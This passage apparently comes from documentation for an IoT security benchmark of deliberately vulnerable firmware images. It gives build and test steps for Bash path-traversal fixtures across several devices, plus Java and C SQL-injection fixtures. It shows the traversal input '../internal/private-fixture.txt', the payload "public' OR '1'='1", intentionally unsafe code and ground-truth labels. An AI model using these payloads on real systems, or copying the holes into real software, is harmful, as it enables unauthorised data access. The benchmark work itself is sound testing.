path construction is `TARGET="${BASE_DIR}${INPUT}"`. There is intentionally no
canonicalization, normalization or intended-directory validation between this
assignment and `done < "$TARGET"`. The benign read-only operation is a Bash
`read -r` loop that prints each line with `printf`. `[[ -f ]]` only checks file
type; it does not restrict the path to `data/`.

Representative vulnerable flow and expected static-analysis data flow:

~~~text
$1 = "../internal/private-fixture.txt" → INPUT
→ TARGET = /usr/share/iotbench/bash-path-traversal/data/../internal/private-fixture.txt
→ quoted Bash input redirection / read builtin
→ synthetic internal file read: SYNTHETIC_INTERNAL_FIXTURE_DATA
~~~

`data/..` resolves to its parent, so `internal/` escapes the intended base.
Expected finding: **CWE-22**, correlate Bash-controlled path construction with
the missing `data/` boundary check and reachable sibling file. Expected exact
ground-truth label: **Vulnerable Bash files — Path Traversal**. The fixed
input-independent jail contains the lab as a whole while preserving this escape.
Safe remediation: enforce resolved containment inside `data/`, including
symlink/race protection, preserve quoting and outer confinement, and verify
public reads still work while traversal is rejected.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=router-cwe022-bash-path-traversal docker compose run --rm yocto
FIRMWARE=router-cwe022-bash-path-traversal ./scripts/run-qemu.sh
~~~

Local test, inside this guest's root serial console:

~~~bash
iotbench-bash-read public.txt
iotbench-bash-read '../internal/private-fixture.txt'
sh /usr/share/iotbench/bash-path-traversal/test-guest.sh router
~~~

Expected: public marker, internal marker, then five `PASS` lines; zero status.
No host or real system file is used. Offline verification (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-bash-path-traversal.py \
  --image /export/router-cwe022-bash-path-traversal/qemuarm64/iotbench-router-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Automatic disposable guest test, separately from
manual QEMU:

~~~bash
python3 scripts/test-bash-path-traversal.py --device router
~~~

### Bash Path Traversal — smartbulb

Simulated device: **lighting controller / smart bulb**, using the existing
`meta-iotbench/recipes-devices/smartbulb/` profile. Firmware directory:
`deploy-images/smartbulb-cwe022-bash-path-traversal/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-smartbulb-cwe022-bash-path-traversal.bb`. The default export is
`deploy-images/smartbulb-cwe022-bash-path-traversal/qemuarm64/iotbench-smartbulb-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` in the same directory. Its sole vulnerability package is
`cwe022-bash-path-traversal`.

Vulnerable Bash script: `/usr/bin/iotbench-bash-read`. Intended base directory
inside the confined process: `/usr/share/iotbench/bash-path-traversal/data/`.
Relevant synthetic files: `data/public.txt` and `internal/private-fixture.txt`
under `/usr/share/iotbench/bash-path-traversal/` as seen by the helper; in the extracted
firmware they are under `/usr/share/iotbench/bash-path-traversal/rootfs/usr/share/iotbench/bash-path-traversal/`.
The internal file contains **`SYNTHETIC_INTERNAL_FIXTURE_DATA`** and is outside
`data/`. NOTICE, ground truth and the guest test live outside the jail under
`/usr/share/iotbench/bash-path-traversal/`.

The input is the first script argument (`$1`), assigned to `INPUT`. The exact
path construction is `TARGET="${BASE_DIR}${INPUT}"`. There is intentionally no
canonicalization, normalization or intended-directory validation between this
assignment and `done < "$TARGET"`. The benign read-only operation is a Bash
`read -r` loop that prints each line with `printf`. `[[ -f ]]` only checks file
type; it does not restrict the path to `data/`.

Representative vulnerable flow and expected static-analysis data flow:

~~~text
$1 = "../internal/private-fixture.txt" → INPUT
→ TARGET = /usr/share/iotbench/bash-path-traversal/data/../internal/private-fixture.txt
→ quoted Bash input redirection / read builtin
→ synthetic internal file read: SYNTHETIC_INTERNAL_FIXTURE_DATA
~~~

`data/..` resolves to its parent, so `internal/` escapes the intended base.
Expected finding: **CWE-22**, correlate Bash-controlled path construction with
the missing `data/` boundary check and reachable sibling file. Expected exact
ground-truth label: **Vulnerable Bash files — Path Traversal**. The fixed
input-independent jail contains the lab as a whole while preserving this escape.
Safe remediation: enforce resolved containment inside `data/`, including
symlink/race protection, preserve quoting and outer confinement, and verify
public reads still work while traversal is rejected.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=smartbulb-cwe022-bash-path-traversal docker compose run --rm yocto
FIRMWARE=smartbulb-cwe022-bash-path-traversal ./scripts/run-qemu.sh
~~~

Local test, inside this guest's root serial console:

~~~bash
iotbench-bash-read public.txt
iotbench-bash-read '../internal/private-fixture.txt'
sh /usr/share/iotbench/bash-path-traversal/test-guest.sh smartbulb
~~~

Expected: public marker, internal marker, then five `PASS` lines; zero status.
No host or real system file is used. Offline verification (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-bash-path-traversal.py \
  --image /export/smartbulb-cwe022-bash-path-traversal/qemuarm64/iotbench-smartbulb-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Automatic disposable guest test, separately from
manual QEMU:

~~~bash
python3 scripts/test-bash-path-traversal.py --device smartbulb
~~~

### Bash Path Traversal — smarthub

Simulated device: **smart-home controller / hub**, using the existing
`meta-iotbench/recipes-devices/smarthub/` profile. Firmware directory:
`deploy-images/smarthub-cwe022-bash-path-traversal/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-smarthub-cwe022-bash-path-traversal.bb`. The default export is
`deploy-images/smarthub-cwe022-bash-path-traversal/qemuarm64/iotbench-smarthub-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` in the same directory. Its sole vulnerability package is
`cwe022-bash-path-traversal`.

Vulnerable Bash script: `/usr/bin/iotbench-bash-read`. Intended base directory
inside the confined process: `/usr/share/iotbench/bash-path-traversal/data/`.
Relevant synthetic files: `data/public.txt` and `internal/private-fixture.txt`
under `/usr/share/iotbench/bash-path-traversal/` as seen by the helper; in the extracted
firmware they are under `/usr/share/iotbench/bash-path-traversal/rootfs/usr/share/iotbench/bash-path-traversal/`.
The internal file contains **`SYNTHETIC_INTERNAL_FIXTURE_DATA`** and is outside
`data/`. NOTICE, ground truth and the guest test live outside the jail under
`/usr/share/iotbench/bash-path-traversal/`.

The input is the first script argument (`$1`), assigned to `INPUT`. The exact
path construction is `TARGET="${BASE_DIR}${INPUT}"`. There is intentionally no
canonicalization, normalization or intended-directory validation between this
assignment and `done < "$TARGET"`. The benign read-only operation is a Bash
`read -r` loop that prints each line with `printf`. `[[ -f ]]` only checks file
type; it does not restrict the path to `data/`.

Representative vulnerable flow and expected static-analysis data flow:

~~~text
$1 = "../internal/private-fixture.txt" → INPUT
→ TARGET = /usr/share/iotbench/bash-path-traversal/data/../internal/private-fixture.txt
→ quoted Bash input redirection / read builtin
→ synthetic internal file read: SYNTHETIC_INTERNAL_FIXTURE_DATA
~~~

`data/..` resolves to its parent, so `internal/` escapes the intended base.
Expected finding: **CWE-22**, correlate Bash-controlled path construction with
the missing `data/` boundary check and reachable sibling file. Expected exact
ground-truth label: **Vulnerable Bash files — Path Traversal**. The fixed
input-independent jail contains the lab as a whole while preserving this escape.
Safe remediation: enforce resolved containment inside `data/`, including
symlink/race protection, preserve quoting and outer confinement, and verify
public reads still work while traversal is rejected.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=smarthub-cwe022-bash-path-traversal docker compose run --rm yocto
FIRMWARE=smarthub-cwe022-bash-path-traversal ./scripts/run-qemu.sh
~~~

Local test, inside this guest's root serial console:

~~~bash
iotbench-bash-read public.txt
iotbench-bash-read '../internal/private-fixture.txt'
sh /usr/share/iotbench/bash-path-traversal/test-guest.sh smarthub
~~~

Expected: public marker, internal marker, then five `PASS` lines; zero status.
No host or real system file is used. Offline verification (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-bash-path-traversal.py \
  --image /export/smarthub-cwe022-bash-path-traversal/qemuarm64/iotbench-smarthub-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Automatic disposable guest test, separately from
manual QEMU:

~~~bash
python3 scripts/test-bash-path-traversal.py --device smarthub
~~~

### Bash Path Traversal — smartplug

Simulated device: **energy-management smart plug**, using the existing
`meta-iotbench/recipes-devices/smartplug/` profile. Firmware directory:
`deploy-images/smartplug-cwe022-bash-path-traversal/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-smartplug-cwe022-bash-path-traversal.bb`. The default export is
`deploy-images/smartplug-cwe022-bash-path-traversal/qemuarm64/iotbench-smartplug-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` in the same directory. Its sole vulnerability package is
`cwe022-bash-path-traversal`.

Vulnerable Bash script: `/usr/bin/iotbench-bash-read`. Intended base directory
inside the confined process: `/usr/share/iotbench/bash-path-traversal/data/`.
Relevant synthetic files: `data/public.txt` and `internal/private-fixture.txt`
under `/usr/share/iotbench/bash-path-traversal/` as seen by the helper; in the extracted
firmware they are under `/usr/share/iotbench/bash-path-traversal/rootfs/usr/share/iotbench/bash-path-traversal/`.
The internal file contains **`SYNTHETIC_INTERNAL_FIXTURE_DATA`** and is outside
`data/`. NOTICE, ground truth and the guest test live outside the jail under
`/usr/share/iotbench/bash-path-traversal/`.

The input is the first script argument (`$1`), assigned to `INPUT`. The exact
path construction is `TARGET="${BASE_DIR}${INPUT}"`. There is intentionally no
canonicalization, normalization or intended-directory validation between this
assignment and `done < "$TARGET"`. The benign read-only operation is a Bash
`read -r` loop that prints each line with `printf`. `[[ -f ]]` only checks file
type; it does not restrict the path to `data/`.

Representative vulnerable flow and expected static-analysis data flow:

~~~text
$1 = "../internal/private-fixture.txt" → INPUT
→ TARGET = /usr/share/iotbench/bash-path-traversal/data/../internal/private-fixture.txt
→ quoted Bash input redirection / read builtin
→ synthetic internal file read: SYNTHETIC_INTERNAL_FIXTURE_DATA
~~~

`data/..` resolves to its parent, so `internal/` escapes the intended base.
Expected finding: **CWE-22**, correlate Bash-controlled path construction with
the missing `data/` boundary check and reachable sibling file. Expected exact
ground-truth label: **Vulnerable Bash files — Path Traversal**. The fixed
input-independent jail contains the lab as a whole while preserving this escape.
Safe remediation: enforce resolved containment inside `data/`, including
symlink/race protection, preserve quoting and outer confinement, and verify
public reads still work while traversal is rejected.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=smartplug-cwe022-bash-path-traversal docker compose run --rm yocto
FIRMWARE=smartplug-cwe022-bash-path-traversal ./scripts/run-qemu.sh
~~~

Local test, inside this guest's root serial console:

~~~bash
iotbench-bash-read public.txt
iotbench-bash-read '../internal/private-fixture.txt'
sh /usr/share/iotbench/bash-path-traversal/test-guest.sh smartplug
~~~

Expected: public marker, internal marker, then five `PASS` lines; zero status.
No host or real system file is used. Offline verification (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-bash-path-traversal.py \
  --image /export/smartplug-cwe022-bash-path-traversal/qemuarm64/iotbench-smartplug-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Automatic disposable guest test, separately from
manual QEMU:

~~~bash
python3 scripts/test-bash-path-traversal.py --device smartplug
~~~

### Bash Path Traversal — smartspeaker

Simulated device: **audio / voice-assistant speaker**, using the existing
`meta-iotbench/recipes-devices/smartspeaker/` profile. Firmware directory:
`deploy-images/smartspeaker-cwe022-bash-path-traversal/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-smartspeaker-cwe022-bash-path-traversal.bb`. The default export is
`deploy-images/smartspeaker-cwe022-bash-path-traversal/qemuarm64/iotbench-smartspeaker-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` in the same directory. Its sole vulnerability package is
`cwe022-bash-path-traversal`.

Vulnerable Bash script: `/usr/bin/iotbench-bash-read`. Intended base directory
inside the confined process: `/usr/share/iotbench/bash-path-traversal/data/`.
Relevant synthetic files: `data/public.txt` and `internal/private-fixture.txt`
under `/usr/share/iotbench/bash-path-traversal/` as seen by the helper; in the extracted
firmware they are under `/usr/share/iotbench/bash-path-traversal/rootfs/usr/share/iotbench/bash-path-traversal/`.
The internal file contains **`SYNTHETIC_INTERNAL_FIXTURE_DATA`** and is outside
`data/`. NOTICE, ground truth and the guest test live outside the jail under
`/usr/share/iotbench/bash-path-traversal/`.

The input is the first script argument (`$1`), assigned to `INPUT`. The exact
path construction is `TARGET="${BASE_DIR}${INPUT}"`. There is intentionally no
canonicalization, normalization or intended-directory validation between this
assignment and `done < "$TARGET"`. The benign read-only operation is a Bash
`read -r` loop that prints each line with `printf`. `[[ -f ]]` only checks file
type; it does not restrict the path to `data/`.

Representative vulnerable flow and expected static-analysis data flow:

~~~text
$1 = "../internal/private-fixture.txt" → INPUT
→ TARGET = /usr/share/iotbench/bash-path-traversal/data/../internal/private-fixture.txt
→ quoted Bash input redirection / read builtin
→ synthetic internal file read: SYNTHETIC_INTERNAL_FIXTURE_DATA
~~~

`data/..` resolves to its parent, so `internal/` escapes the intended base.
Expected finding: **CWE-22**, correlate Bash-controlled path construction with
the missing `data/` boundary check and reachable sibling file. Expected exact
ground-truth label: **Vulnerable Bash files — Path Traversal**. The fixed
input-independent jail contains the lab as a whole while preserving this escape.
Safe remediation: enforce resolved containment inside `data/`, including
symlink/race protection, preserve quoting and outer confinement, and verify
public reads still work while traversal is rejected.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=smartspeaker-cwe022-bash-path-traversal docker compose run --rm yocto
FIRMWARE=smartspeaker-cwe022-bash-path-traversal ./scripts/run-qemu.sh
~~~

Local test, inside this guest's root serial console:

~~~bash
iotbench-bash-read public.txt
iotbench-bash-read '../internal/private-fixture.txt'
sh /usr/share/iotbench/bash-path-traversal/test-guest.sh smartspeaker
~~~

Expected: public marker, internal marker, then five `PASS` lines; zero status.
No host or real system file is used. Offline verification (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-bash-path-traversal.py \
  --image /export/smartspeaker-cwe022-bash-path-traversal/qemuarm64/iotbench-smartspeaker-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Automatic disposable guest test, separately from
manual QEMU:

~~~bash
python3 scripts/test-bash-path-traversal.py --device smartspeaker
~~~

### Bash Path Traversal — thermostat

Simulated device: **climate-control thermostat**, using the existing
`meta-iotbench/recipes-devices/thermostat/` profile. Firmware directory:
`deploy-images/thermostat-cwe022-bash-path-traversal/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-thermostat-cwe022-bash-path-traversal.bb`. The default export is
`deploy-images/thermostat-cwe022-bash-path-traversal/qemuarm64/iotbench-thermostat-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` in the same directory. Its sole vulnerability package is
`cwe022-bash-path-traversal`.

Vulnerable Bash script: `/usr/bin/iotbench-bash-read`. Intended base directory
inside the confined process: `/usr/share/iotbench/bash-path-traversal/data/`.
Relevant synthetic files: `data/public.txt` and `internal/private-fixture.txt`
under `/usr/share/iotbench/bash-path-traversal/` as seen by the helper; in the extracted
firmware they are under `/usr/share/iotbench/bash-path-traversal/rootfs/usr/share/iotbench/bash-path-traversal/`.
The internal file contains **`SYNTHETIC_INTERNAL_FIXTURE_DATA`** and is outside
`data/`. NOTICE, ground truth and the guest test live outside the jail under
`/usr/share/iotbench/bash-path-traversal/`.

The input is the first script argument (`$1`), assigned to `INPUT`. The exact
path construction is `TARGET="${BASE_DIR}${INPUT}"`. There is intentionally no
canonicalization, normalization or intended-directory validation between this
assignment and `done < "$TARGET"`. The benign read-only operation is a Bash
`read -r` loop that prints each line with `printf`. `[[ -f ]]` only checks file
type; it does not restrict the path to `data/`.

Representative vulnerable flow and expected static-analysis data flow:

~~~text
$1 = "../internal/private-fixture.txt" → INPUT
→ TARGET = /usr/share/iotbench/bash-path-traversal/data/../internal/private-fixture.txt
→ quoted Bash input redirection / read builtin
→ synthetic internal file read: SYNTHETIC_INTERNAL_FIXTURE_DATA
~~~

`data/..` resolves to its parent, so `internal/` escapes the intended base.
Expected finding: **CWE-22**, correlate Bash-controlled path construction with
the missing `data/` boundary check and reachable sibling file. Expected exact
ground-truth label: **Vulnerable Bash files — Path Traversal**. The fixed
input-independent jail contains the lab as a whole while preserving this escape.
Safe remediation: enforce resolved containment inside `data/`, including
symlink/race protection, preserve quoting and outer confinement, and verify
public reads still work while traversal is rejected.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=thermostat-cwe022-bash-path-traversal docker compose run --rm yocto
FIRMWARE=thermostat-cwe022-bash-path-traversal ./scripts/run-qemu.sh
~~~

Local test, inside this guest's root serial console:

~~~bash
iotbench-bash-read public.txt
iotbench-bash-read '../internal/private-fixture.txt'
sh /usr/share/iotbench/bash-path-traversal/test-guest.sh thermostat
~~~

Expected: public marker, internal marker, then five `PASS` lines; zero status.
No host or real system file is used. Offline verification (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-bash-path-traversal.py \
  --image /export/thermostat-cwe022-bash-path-traversal/qemuarm64/iotbench-thermostat-cwe022-bash-path-traversal-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Automatic disposable guest test, separately from
manual QEMU:

~~~bash
python3 scripts/test-bash-path-traversal.py --device thermostat
~~~

## Vulnerable Java JARs — SQL Injection

### Build, boot and manual testing

**What this tests.** The Java service concatenates the search name into a SQLite
query executed through JDBC. Normal searches enforce `visibility = 'public'`.
The SQL input below adds an always-true condition and exposes the internal
record too. The database contains only synthetic data and is read-only.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe089-java-sql-injection docker compose run --rm yocto
QEMU_HTTP_PORT=18080 FIRMWARE=router-cwe089-java-sql-injection ./scripts/run-qemu.sh
```

**Test — browser:** open <http://127.0.0.1:18080> and find
**Configuration Lookup**. Enter each value in **Record name**, then click
**Search configuration** after each entry:

| Exact input | Expected result |
| --- | --- |
| `public` | Only `public\|SYNTHETIC_PUBLIC_FIXTURE_DATA` |
| `internal` | `No public configuration found`; no records |
| `public' OR '1'='1` | The public row and `internal\|SYNTHETIC_INTERNAL_FIXTURE_DATA` |

In the web field, enter the payload without surrounding double quotes.
The internal record appearing only after injection demonstrates the bypass.
If the panel is missing, rebuild the updated export and restart QEMU.

**Alternative — guest**, after logging in through the serial console:

```sh
JAR=/usr/share/iotbench/java-sql-injection/fixture-db-query.jar
java -Xmx32m -jar "$JAR" public
echo "exit=$?"
java -Xmx32m -jar "$JAR" internal
echo "exit=$?"
java -Xmx32m -jar "$JAR" "public' OR '1'='1"
echo "exit=$?"
```

Expected: the same records as in the table, in the same order. All three
commands return `exit=0`. Each invocation also prints the fixture notice.
Double quotes in the CLI pass the entire payload as one argument.

**Optional regression — guest:**

```sh
sh /usr/share/iotbench/java-sql-injection/test-guest.sh router
echo "exit=$?"
```

Expected: five `PASS` lines and `exit=0`. For the full CLI and web check that
boots and closes QEMU automatically, first close the manual instance, then run
`python3 scripts/test-java-sql-injection.py --device router` on the host.

If the browser shows `Configuration service unavailable`, check in the guest:

```sh
systemctl status iotbench-java-sql.service --no-pager
journalctl -u iotbench-java-sql.service -n 30 --no-pager
```

The backend listens on guest `127.0.0.1:18089`; the host browser still accesses
it through the dashboard on port 18080. For dependencies, the complete query,
ground truth and validation details, see [the Java guide](java-sql-injection.md).

## Vulnerable C Binaries — SQL injection

### Build, boot and manual testing

**What this tests.** The C binary inserts the record name directly into a SQLite
query. The payload changes an exact name lookup into a condition selecting both
records. This C variant does not apply the Java variant's
`visibility = 'public'` filter: it tests manipulation of the search logic,
rather than bypassing that filter.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe089-c-sql-injection docker compose run --rm yocto
QEMU_HTTP_PORT=18080 FIRMWARE=router-cwe089-c-sql-injection ./scripts/run-qemu.sh
```

**Test — guest:**

```sh
fixture-db-query public
echo "exit=$?"
fixture-db-query unknown
echo "exit=$?"
fixture-db-query "public' OR '1'='1"
echo "exit=$?"
```

Expected: `public` returns only `public|SYNTHETIC_PUBLIC_FIXTURE_DATA`;
`unknown` returns no records; the payload returns the public row followed by
`internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`. All three queries return `exit=0`
and print the fixture notice to stderr. The additional record demonstrates
that the input changed the SQL selection. The database remains read-only.
Test this fixture through the guest CLI; it has no web panel.

> INTENTIONALLY INSECURE SYNTHETIC TEST FIXTURE — LOCAL SECURITY TESTING ONLY — NOT FOR DEPLOYMENT

### Scenario, source and sink

Each of the eleven existing profiles has one new `<device>-cwe089-c-sql-injection`
firmware with the sole vulnerability package `cwe089-c-sql-injection`. They reuse
the common image, native services, simulated peripherals, pinned layers,
architecture selector, cross compiler and export/QEMU mechanisms. The canonical
input is a local command-line argument, so no web module or remote input is needed.

Expected exact ground-truth label: **Vulnerable C Binaries — SQL injection**.
Expected finding: **CWE-89**, externally controlled SQL syntax in a native C
firmware executable exposing an additional synthetic record through SELECT.
The full required relationship is **C binary input + SQL query construction +
user-controlled value inserted into SQL syntax + missing secure parameter
binding + SQLite query execution + modified query semantics**.

The corresponding source is
[`fixture-db-query.c`](../meta-iotbench/recipes-vulns/cwe089-c-sql-injection/files/fixture-db-query.c).
Exact locations (also installed as the same source in the firmware):

| Stage | Source location | Meaning |
| --- | --- | --- |
| Source | `main()`, lines 50–54 | Length-check `argv[1]` and assign `input` |
| Transformation / missing protection | `main()`, lines 57–59 | `snprintf()` directly embeds `input` in `WHERE record_name = '%s'`; no binding or SQL escaping |
| Database open | `main()`, line 65 | Fixed path, `sqlite3_open_v2(..., SQLITE_OPEN_READONLY, NULL)` |
| Preparation sink | `main()`, line 77 | `sqlite3_prepare_v2(db, query, -1, &stmt, &tail)` consumes the constructed SQL |
| Execution sink | `main()`, line 81 | `sqlite3_step(stmt)` executes the SELECT and retrieves rows |
| Consequence | `main()`, lines 84–86 | `sqlite3_column_text()` and fixed-format `printf()` return synthetic values |

Representative vulnerable flow and expected static-analysis data flow:

~~~text
argv[1] = "public' OR '1'='1" → input
→ snprintf() constructs SQL query
→ SELECT record_name, record_value FROM fixture_records
  WHERE record_name = 'public' OR '1'='1' ORDER BY id;
→ sqlite3_prepare_v2() → sqlite3_step() → sqlite3_column_text()
→ synthetic internal database record returned: SYNTHETIC_INTERNAL_FIXTURE_DATA
~~~

The quote closes the intended SQL value; `OR '1'='1'` becomes an always-true
SQL predicate, so both rows match. Normal `public` produces only
`WHERE record_name = 'public' ORDER BY id;`, selecting row 1. The program intends
a single named lookup. It instead treats externally controlled text as SQL
syntax rather than a bound SQL value. `sqlite3_prepare_v2()` alone is not safe
parameterization: the vulnerability is already present in the SQL it receives.
There is no `sqlite3_bind_text()`, integer binding, placeholder, `%q` escaping,
quote/operator filtering, value allowlist or query rewriting in this code path.

These are not generic vulnerable Java/JAR applications, SQL injection in Java,
PHP or Python, or Bash-based vulnerabilities. Only the native C executable
constructs and executes the vulnerable query; shell/Python code is test harness
code. This differs from generic C argument consumers, C database openers, fixed
SQLite query programs and correctly parameterized applications: accepting an
argument, opening a database or executing a fixed query alone is insufficient.
The complete source-to-SQL-to-execution relationship is required. These are not
buffer overflow, memory corruption, command injection, arbitrary command
execution or unsafe sudo helper examples. The C program never invokes a shell,
process, package manager or network API and adds no SUID, sudo rule, login,
privilege grant or unrelated application outside the firmware.

### Database, packaging and runtime scope

| Artifact | Firmware path / role |
| --- | --- |
| Vulnerable native ELF executable | `/usr/bin/fixture-db-query`, root:root `0755` |
| Synthetic SQLite database | `/usr/share/iotbench/c-sql-injection/fixture.db`, root:root `0444` |
| Matching C source | `/usr/share/iotbench/c-sql-injection/fixture-db-query.c` |
| Supporting firmware assets | `schema.sql`, `NOTICE`, `LICENSE`, `ground-truth.json`, `test-guest.sh` in the same data directory, root:root `0644` |
| Repository package / source directory | `meta-iotbench/recipes-vulns/cwe089-c-sql-injection/` / `files/` |

The schema is `fixture_records(id INTEGER PRIMARY KEY, record_name TEXT NOT NULL
UNIQUE, record_value TEXT NOT NULL, visibility TEXT NOT NULL)`, with a CHECK
restricting `visibility` to `public` or `internal`. Its exact two rows are:

| id | record_name | record_value | visibility |
| --- | --- | --- | --- |
| 1 | public | SYNTHETIC_PUBLIC_FIXTURE_DATA | public |
| 2 | internal | SYNTHETIC_INTERNAL_FIXTURE_DATA | internal |

All values are synthetic, contain no credentials or real data, and are identical
across profiles. "Internal" denotes the extra record outside the normal public
lookup result, not an OS permission boundary or a separate authentication bug.
`schema.sql` creates records only during the build using `sqlite3-native`;
there is no runtime creation, modification, deletion or schema change. The
recipe recreates the database from scratch with fixed page size and ordered
rows. The database format is portable across the existing target architectures.

The package uses `${CC} ${CPPFLAGS} ${CFLAGS} ${LDFLAGS}`, links `-lsqlite3`,
and depends on `sqlite3 sqlite3-native` from the already pinned core layer.
Yocto supplies the cross compiler, target headers/library, shared-library
runtime dependency and native database generator. The target SQLite CLI and
Python are unnecessary. `util-linux-setpriv` is used only by the guest test to
prove unprivileged execution. File layout and permissions follow the existing
local-helper convention; there is no new firmware architecture or service.

The executable opens only its compiled fixed database path (no filename/env
argument, URI flag or host database). It enforces a read-only connection and a
single read-only two-column statement, finalizes it and closes the connection.
An independent SQLite authorizer permits only SELECT and reads from
`main.fixture_records`; it denies other tables, ATTACH, SQL functions and all
write operations. Extension loading is explicitly disabled. These restrictions
contain the lab to synthetic data; they do not inspect or constrain WHERE
predicates, and the required OR injection remains effective. Input is capped
at 240 bytes solely for bounded storage, `snprintf()` is checked, and SQLite
errors and null column pointers are handled. A progress budget, expression and
value limits and a 16-row output cap bound work. Output uses a constant format.
No external database, credentials, sockets, host filesystem writes, persistence
or system security changes are involved. The helper needs no root privileges.
The exact warning appears in package NOTICE, `/etc/motd` and helper stderr.

### Shared build and local verification

From the host repository root, parse and resolve dependencies:

~~~bash
docker compose run --rm yocto bash -lc \
  'source /opt/yocto/yocto-env.sh && bitbake -p && bitbake -n iotbench-router-cwe089-c-sql-injection'
~~~

Build all eleven with the existing process:

~~~bash
for recipe in meta-iotbench/recipes-images/iotbench-*-cwe089-c-sql-injection.bb; do
    firmware=$(basename "$recipe" .bb)
    FIRMWARE="${firmware#iotbench-}" docker compose run --rm yocto || exit 1
done
~~~

Default machine is `qemuarm64`. Set the same `YOCTO_MACHINE` for build and boot
for `qemuarm`, `qemux86-64`, `qemux86` or `qemumips`. The recipes contain no fixed
CPU or toolchain; architecture builds use the established Yocto conventions.
`scripts/build-all.sh` automatically discovers the new recipes.

The guest test has six assertion groups: native ELF/database installation and
ordinary permissions; deterministic public-only lookup and absent-name behavior;
the exact injection returning both records; argument counts, length boundaries,
malformed SQL and literal shell-shaped values; extra-statement/schema/function
rejection; and non-root execution with unchanged database checksum and no journal
sidecars. All lookup invocations use UID/GID 65534 with cleared supplementary
groups. It uses only benign SELECT payloads and never modifies the database.
A hardened parameterized replacement would fail the intended positive injection
assertion. Exit codes are 0 for successful queries (including zero matches),
1 for SQLite/scope failures, and 2 for argument/length errors.

`scripts/test-c-sql-injection.py --image <ext4-or-ext4.zst>` reads firmware with
`debugfs` without mounting or executing it, verifies ELF SQLite API references
and fixed path, exact source/assets, normal ownership/modes and safe ancestors,
warning, schema and both synthetic rows. It opens only a temporary copy of the
extracted synthetic database with Python SQLite `mode=ro&immutable=1`; Python
is test infrastructure, not the vulnerability implementation. Expected output:
two `PASS` lines. The builder's cached `e2fsprogs-native` provides `debugfs`;
use `--debugfs` if it is not on PATH (see the per-device examples).

Automatic runtime tests use the existing serial console in disposable QEMU
snapshots, close QEMU on completion and save `validation-console.log` beside
each export. Run separately from manual QEMU:

~~~bash
python3 scripts/test-c-sql-injection.py --device router
python3 scripts/test-c-sql-injection.py --all
# Apple Silicon acceleration and unused existing device-service ports:
QEMU_ACCEL=hvf QEMU_CPU=host QEMU_HTTP_PORT=18080 \
  QEMU_MQTT_PORT=21883 QEMU_MODBUS_PORT=11502 \
  python3 scripts/test-c-sql-injection.py --all
~~~

The runner requires host QEMU and `zstd`. Tests need no internet or external
service. Host-loopback forwards support only the unchanged device services;
the SQL helper itself has no network surface.

### Safe remediation

In a separate corrected variant, prepare this constant SQL:

~~~sql
SELECT record_name, record_value FROM fixture_records
WHERE record_name = ? ORDER BY id;
~~~

Call `sqlite3_prepare_v2()` on that fixed query, then
`sqlite3_bind_text(stmt, 1, input, -1, SQLITE_TRANSIENT)`, check return codes,
and use `sqlite3_step()` before finalizing and closing. The input then remains
a value even when it contains quotes or SQL operators. Keep the read-only
connection, bounded input and ordinary permissions. Normal `public` must still
return its marker; the crafted string must return no row and no internal
marker. The intentionally vulnerable fixtures do not implement this fix.

### Completed validation

On 2026-10-16, all eleven `qemuarm64` fixtures built and exported successfully
using the pinned builder after clean layer parsing and a router dependency dry
run. Each exported manifest contains exactly one vulnerability package,
`cwe089-c-sql-injection`, and the target `libsqlite3-0` shared library. The native
C helper compiled with `-Wall -Wextra -Werror` and the normal Yocto flags.

Offline `debugfs` verification passed for every compressed ext4 image: actual
native ELF and SQLite API references, compiled fixed database path, exact
installed source/schema/test/metadata, two synthetic records and database
integrity, ordinary root-owned permissions and safe ancestors, device identity
and required NOTICE/login warning. Helper and database bytes are identical
across all eleven images. Two fresh database generations using the pinned
`sqlite3-native` matched each other and the installed database byte for byte.

All eleven images then booted as disposable QEMU snapshots with HVF/host CPU
and passed all six guest assertion groups, **66 checks total**. The exact
normal lookup returned only the public marker; the exact injection returned
both public and internal markers. Every lookup ran as UID/GID 65534 with cleared
groups. Argument and length boundaries, malformed SQL, literal shell-shaped
input, extra statements, non-fixture tables and SQL functions behaved as
specified; the database checksum stayed unchanged and no journal sidecar
appeared. Tests used only the local serial console and existing device-service
host-loopback ports HTTP `18080`, MQTT `21883` and Modbus `11502`. The SQL helper
uses no network. The guest checks use commands supported by the pinned BusyBox
configuration and do not modify the database.

The [local validation report](../deploy-images/c-sql-injection-qemuarm64-validation.txt)
records all 66 assertions and SHA-256 checksums for compressed rootfs, kernel,
manifest, console logs and implementation sources. Each device export contains
